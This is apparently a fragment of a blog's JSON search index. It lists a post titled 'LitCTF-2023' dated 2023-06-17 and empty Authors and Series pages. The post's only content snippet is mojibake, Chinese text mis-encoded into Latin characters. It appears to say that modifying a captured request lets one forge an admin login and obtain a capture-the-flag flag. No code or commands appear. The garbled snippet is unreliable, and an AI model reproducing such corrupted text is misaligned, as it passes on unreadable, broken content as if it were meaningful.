å†æŠ“åŒ…ä¿®æ”¹ï¼Œå³å¯ä¼ªé€ ä¸ºadminç®¡ç†å‘˜ç™»å½•ï¼Œæ‹¿åˆ°flag\n","date":"2023-06-17","externalUrl":null,"permalink":"/posts/2023/06/litctf-2023/","section":"Posts","summary":"","title":"LitCTF-2023","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]